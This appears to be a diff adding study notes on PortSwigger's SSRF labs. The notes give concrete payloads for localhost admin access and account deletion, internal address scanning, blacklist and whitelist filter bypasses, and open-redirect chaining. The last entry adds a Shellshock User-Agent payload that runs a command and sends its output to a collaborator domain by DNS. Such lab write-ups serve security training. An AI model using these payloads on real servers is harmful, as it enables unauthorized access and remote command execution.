@@ -1,0 +1,51 @@
+Server Side Request Forgery Vulnerability
+
+https://portswigger.net/web-security/ssrf
+
+
+
+
+
+
+
+SSRF attacks against the server itself
+	Basic SSRF against the local server
+		Request to Check stock and intercept that packet. notice that "StockApi={web address}" is used. so change web address to http://localhost/admin to retrieve admin panel page. then delete carlos but it is only allowed from authenticated user or from localhost. so send parameter StockApi with http://localhost/admin/delete?username=carlos to delete carlos account.
+
+-----------------------------------------------------------------------------
+
+SSRF attacks against other back-end systems
+	Basic SSRF against another back-end system
+		Request to check stock and intercept that packet. notice that "Stockapi={Web address}" is used. send it to intruder to determine interact with other back-end systems on range 192.168.0.x . send http://192.168.0.x:8080/admin to retrieve admin panel.
+
+------------------------------------------------------------------------------
+		
+SSRF with blacklist-based input filters
+	SSRF with blacklist-based input filter
+		Request to check stock and intercept that packet. notice that "Stockapi={web address}" is used. also notice that localhost or 127.0.0.1 addresses are blocked. to bypass this and retrieve admin panel send http://127.1/ADMIN instead of http://127.0.0.1/admin
+
+
+-------------------------------------------------------------------------------
+
+SSRF with whitelist-based input filters
+	SSRF with whitelist-based input filter
+		Request to check stock and intercept that packet. notice that "Stockapi={web address}" is used. also notice that it is whitelisted and "stock.weliketoshop.net" is required. Observe that URL parser supports embedded credentials with http://username@stock.weliketoshop.net. then Append a "#" to the username and observe that the URL is now rejected. Double-URL encode the "#" to %2523 and send http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos to bypass whitelist and retrieve admin panel.
+
+
+-------------------------------------------------------------------------------
+
+Bypassing SSRF filters via open redirection
+	SSRF with filter bypass via open redirection vulnerability
+		Request to check stock and intercept that packet. notice that "Stockapi={web address}" is used. also notice "Next product" link. send it and observe  that "&path=/product?productId=3 " is used. so change it to "&path=192.168.0.12:8080/admin" and send request with "Stockapi" parameter. like "Stockapi=/product/nextProduct?currentProductId=2&path=http://192.168.0.12:8080/admin" to retrieve admin panel.
+	
+-------------------------------------------------------------------------------
+
+Blind SSRF vulnerabilities
+	Blind SSRF with out-of-band detection 
+		Visit a product, intercept the request in Burp Suite, and send it to Burp Repeater Change the Referer header with our generetared burp collaborator domain and send request.
+	
+	
+	Blind SSRF with Shellshock exploitation
+		Visit a product, intercept the request in Burp Suite. Use shellshok payload so change User-agent header with " () { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net" . it will execute whoami command into subdomain. then change referer header to http://192.168.0.x:8080 and send it to intruder. mark "x" and run intruder to execute and retrieve "whoami" command.
+
+---------------------------------------------------------------------------------
